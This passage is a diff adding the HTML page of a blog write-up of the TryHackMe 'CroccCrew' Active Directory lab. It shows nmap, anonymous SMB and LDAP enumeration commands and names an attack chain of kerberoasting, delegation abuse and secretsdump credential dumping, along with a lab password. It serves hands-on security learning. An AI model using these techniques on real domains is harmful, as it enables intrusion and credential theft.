@@ -1,0 +1,1847 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - CroccCrew WriteUp | 0xblivion.dev</title>
+<meta name="keywords" content="walkthrough, writeup, tryhackme, windows, active directory, RDP Enumeration, RDP sec nla, Constrained Delegation, Keberoasting, ldapsearch, ldapdomaindump, AllowedToDelagate">
+<meta name="description" content="Overview
+
+Crocc Crew is an insane machine on TryHackMe, but it&rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.
+
+
+    
+        
+            
+            
+            
+        
+    
+    
+        
+            Target IP
+            10.10.208.147
+        
+        
+    
+
+
+
+
+
+
+
+
+
+  
+    &#43;
+    −
+    ⌂
+  
+  
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin!  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator  
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew  
+
+
+
+
+  
+  
+  
+
+
+
+
+
+
+1. Initial Access (TA0001)
+As always, the first step is a thorough nmap scan to see what we&rsquo;re working with.">
+<meta name="author" content="0xblivion">
+<link rel="canonical" href="https://0xblivion.dev/posts/thm/windows/tryhackme/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://0xblivion.dev/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xblivion.dev/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xblivion.dev/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xblivion.dev/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xblivion.dev/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://0xblivion.dev/posts/thm/windows/tryhackme/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://0xblivion.dev/posts/thm/windows/tryhackme/">
+  <meta property="og:site_name" content="0xblivion.dev">
+  <meta property="og:title" content="TryHackMe - CroccCrew WriteUp">
+  <meta property="og:description" content="Overview Crocc Crew is an insane machine on TryHackMe, but it’s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.
+Target IP 10.10.208.147 &#43; − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin! [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew 1. Initial Access (TA0001) As always, the first step is a thorough nmap scan to see what we’re working with.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-10T00:00:00+00:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="RDP Enumeration">
+    <meta property="og:image" content="https://0xblivion.dev/img/croccCrew/card.png">
+  
+  <meta name="author" content="0xblivion">
+  <meta property="article:author" content="0xblivion">
+  <meta property="og:article:author" content="0xblivion">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "author": {
+        "@type": "Person",
+        "name": "0xblivion"
+      }
+    }
+  </script>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0xblivion.dev/img/croccCrew/card.png">
+<meta name="twitter:title" content="TryHackMe - CroccCrew WriteUp">
+<meta name="twitter:description" content="Overview
+
+Crocc Crew is an insane machine on TryHackMe, but it&rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.
+
+
+    
+        
+            
+            
+            
+        
+    
+    
+        
+            Target IP
+            10.10.208.147
+        
+        
+    
+
+
+
+
+
+
+
+
+
+  
+    &#43;
+    −
+    ⌂
+  
+  
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin!  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator  
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew  
+
+
+
+
+  
+  
+  
+
+
+
+
+
+
+1. Initial Access (TA0001)
+As always, the first step is a thorough nmap scan to see what we&rsquo;re working with.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xblivion.dev/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - CroccCrew WriteUp",
+      "item": "https://0xblivion.dev/posts/thm/windows/tryhackme/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - CroccCrew WriteUp",
+  "name": "TryHackMe - CroccCrew WriteUp",
+  "description": "Overview Crocc Crew is an insane machine on TryHackMe, but it\u0026rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.\nTarget IP 10.10.208.147 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin! [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew 1. Initial Access (TA0001) As always, the first step is a thorough nmap scan to see what we\u0026rsquo;re working with.\n",
+  "keywords": [
+    "walkthrough", "writeup", "tryhackme", "windows", "active directory", "RDP Enumeration", "RDP sec nla", "Constrained Delegation", "Keberoasting", "ldapsearch", "ldapdomaindump", "AllowedToDelagate"
+  ],
+  "articleBody": "Overview Crocc Crew is an insane machine on TryHackMe, but it’s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.\nTarget IP 10.10.208.147 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin! [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew 1. Initial Access (TA0001) As always, the first step is a thorough nmap scan to see what we’re working with.\n0xblivion@crocccrew: ~ root@localhost:~# sudo nmap -sVC -oA nmap/crocccew.nmap -vv 10.10.208.147 # Nmap 7.95 scan initiated Tue Jul 8 22:57:20 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/crocccew -vv 10.10.208.147 Nmap scan report for 10.10.232.56 Host is up, received echo-reply ttl 125 (0.12s latency). Scanned at 2025-07-08 22:57:20 EDT for 66s Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-09 02:57:35Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.COOCTUS.CORP | Issuer: commonName=DC.COOCTUS.CORP | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-08T02:57:02 | Not valid after: 2026-01-07T02:57:02 | MD5: 78dc:192b:b5b8:8825:8fc8:694a:0347:7704 | SHA-1: a413:afa5:27c4:a5bf:4418:f49c:cf20:b0b6:e312:7561 | -----BEGIN CERTIFICATE----- | MIIC4jCCAcqgAwIBAgIQUedVsKPVb7FAziU1B3KpMzANBgkqhkiG9w0BAQsFADAa | MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjUwNzA4MDI1NzAyWhcNMjYw | MTA3MDI1NzAyWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG | SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCwriWZOi4e7FNBmyqXt4U3dZwT4AtJ0Nd7 | 4kBUyj6W9nolkMit/WmQfY5fdPm8hYYD7v9EuENfOaIUDuJ+58EBqHqVa1MEvKtK | N72oHiVGmIXfHpSFgkSbwktt1oye5J7SDPtlLqr+21RaTpvQE67VZnb78tqvflhy | eks7EieAsQ10CK2SRR1JDclJUns5ibJv6htsP6D0rmJ4sF+VLCdXIh2A7QvHk3qD | cWsIBUlUgct2wmxrPpiClt9lU0YnIUqL0MOGSt+TyK7JfNLEtdwD/PEuKYriY8Kf | x1KDfB9ZYZ7sv+u22csEcLu/337TrE5XRiwPM4xqo6DvEOZPgDe5AgMBAAGjJDAi | MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF | AAOCAQEANW4kPq2xALqBFsfbqAoeCph6qIwwpRr78Iy700Nx4m0UgLrHSFrZ9M2Q | KnMQfregVusen0Zkk9QdgNn/nTKgNqO/lQNrUpL2RE6jadnSrMEucXAaTY9m3ph7 | Ty5TwPWgX6EAlSfnFO1FQoVM+sNWEF68akQeGSUESsHW0DWmaNrbdTYd+sy2/CZr | EfVEVQMMNhHWVR4rHEvRf/B5P2VERAMdRTtgUUe6Ysw0r0osZ1fa+mfU+rPO0wjv | mfTwL7PKicvIvA4Ljlh9h6FizzWMIvr5lRK3Dxm66hHuyduQCfI/+vsn+KejlKLy | fM6uyRPAZQ8pf7KWGiddXmlm/7X5gw== |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: COOCTUS | NetBIOS_Domain_Name: COOCTUS | NetBIOS_Computer_Name: DC | DNS_Domain_Name: COOCTUS.CORP | DNS_Computer_Name: DC.COOCTUS.CORP | Product_Version: 10.0.17763 |_ System_Time: 2025-07-09T02:57:43+00:00 |_ssl-date: 2025-07-09T02:58:22+00:00; -2s from scanner time. Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 65000/tcp): CLEAN (Timeout) | Check 2 (port 48223/tcp): CLEAN (Timeout) | Check 3 (port 18913/udp): CLEAN (Timeout) | Check 4 (port 21237/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2025-07-09T02:57:46 |_ start_date: N/A Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 8 22:58:26 2025 -- 1 IP address (1 host up) scanned in 65.91 seconds copy The scan results clearly point to a Windows Domain Controller for the COOCTUS.CORP domain. We have all the standard AD ports (Kerberos, LDAP, SMB) plus RDP on port 3389. I added the relevant hostnames to my /etc/hosts file to ensure proper name resolution.\n0xblivion@crocccrew: ~ root@localhost:~# echo '10.10.208.147 dc dc.cooctus.corp cooctus.corp' | sudo tee -a /etc/hosts copy Anonymous Enumeration (T1087) Without any credentials, I started with some unauthenticated enumeration to see what I could find. First, an anonymous SMB login to check for readable shares.\n0xblivion@crocccrew: ~ root@localhost:~# nxc smb $target -u '' -p '' --shares SMB 10.10.208.147 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False) SMB 10.10.208.147 445 DC [+] COOCTUS.CORP\\: SMB 10.10.208.147 445 DC [-] Error enumerating shares: STATUS_ACCESS_DENIED copy I could authenticate as an anonymous user, but didn’t have permissions to list the shares. Next, I tried an anonymous LDAP bind to see if I could dump any information about the domain structure.\n0xblivion@crocccrew: ~ root@localhost:~# ldapsearch -x -H ldap://$target -s base namingcontexts # extended LDIF # # LDAPv3 # base \u003c\u003e (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=COOCTUS,DC=CORP namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 root@localhost:~# ldapsearch -x -H ldap://$target -b 'DC=COOCTUS,DC=CORP' # extended LDIF # # LDAPv3 # base ",
+  "wordCount" : "786",
+  "inLanguage": "en",
+  "image":"https://0xblivion.dev/img/croccCrew/card.png","datePublished": "2025-07-10T00:00:00Z",
+  "dateModified": "2025-07-10T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xblivion"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xblivion.dev/posts/thm/windows/tryhackme/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xblivion.dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xblivion.dev/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xblivion.dev/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xblivion.dev/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xblivion.dev/">Home</a>&nbsp;»&nbsp;<a href="https://0xblivion.dev/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - CroccCrew WriteUp
+    </h1>
+    <div class="post-meta"><span title='2025-07-10 00:00:00 +0000 UTC'>July 10, 2025</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;0xblivion
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#1-initial-access-ta0001" aria-label="1. Initial Access (TA0001)">1. Initial Access (TA0001)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#anonymous-enumeration-t1087" aria-label="Anonymous Enumeration (T1087)">Anonymous Enumeration (T1087)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#2-privilege-escalation-ta0004" aria-label="2. Privilege Escalation (TA0004)">2. Privilege Escalation (TA0004)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#kerberoasting-t1558003" aria-label="Kerberoasting (T1558.003)">Kerberoasting (T1558.003)</a></li>
+                <li>
+                    <a href="#bloodhound-analysis-t1069" aria-label="BloodHound Analysis (T1069)">BloodHound Analysis (T1069)</a></li>
+                <li>
+                    <a href="#constrained-delegation-abuse-t1558001" aria-label="Constrained Delegation Abuse (T1558.001)">Constrained Delegation Abuse (T1558.001)</a></li>
+                <li>
+                    <a href="#finding-the-planted-account" aria-label="Finding the Planted Account">Finding the Planted Account</a>
+                </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<img src="/img/croccCrew/crocc.png" alt="" class="img-responsive" loading="lazy" />
+<p><code>Crocc Crew</code> is an insane machine on <a href="http://tryhackme.com/">TryHackMe</a>, but it&rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating <code>secretsdump</code> error that I almost rage quit and touched grass. Let’s walk through it.</p>
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.208.147</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
+
+
+
+
+
+<div id="flowchart-1752165639838699525" class="attack-path-flowchart">
+  <div class="flowchart-controls">
+    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
+    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
+    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
+  </div>
+  <div class="flowchart-data" style="display: none;">
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin!  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator  
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted User: admCroccCrew  
+</div>
+</div>
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+
+<style>
+.attack-path-flowchart {
+  width: 100%;
+  height: 500px;
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flowchart-controls {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 5px;
+}
+
+.zoom-btn {
+  width: 32px;
+  height: 32px;
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s ease;
+}
+
+.zoom-btn:hover {
+  background: rgba(0, 0, 0, 0.9);
+  border-color: rgba(255, 255, 255, 0.4);
+}
+
+.flowchart-svg {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  cursor: grab;
+}
+
+.flowchart-svg:active {
+  cursor: grabbing;
+}
+
+.flowchart-node {
+  cursor: pointer;
+}
+
+.flowchart-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 36px;
+  text-anchor: middle;
+  dominant-baseline: central;
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-image {
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-text {
+  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  text-anchor: middle;
+  pointer-events: none;
+  user-select: none;
+  fill: #ddd;
+}
+
+.flowchart-arrow {
+  stroke: rgba(255, 255, 255, 0.4);
+  stroke-width: 1.5px;
+  transition: all 0.2s ease-in-out;
+}
+
+.flowchart-arrow.glow {
+  stroke: rgba(255, 255, 255, 1);
+  stroke-width: 2.5px;
+  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
+}
+
+.flowchart-arrow-marker {
+  fill: rgba(255, 255, 255, 0.6);
+}
+
+.flowchart-pin-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 16px;
+  fill: #DC143C;  
+  text-anchor: middle;
+  dominant-baseline: central;
+  display: none;  
+  pointer-events: none;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
+}
+
+
+ 
+.node-recon .flowchart-icon { color: #A0522D; }  
+.node-enum .flowchart-icon { color: #4169E1; }  
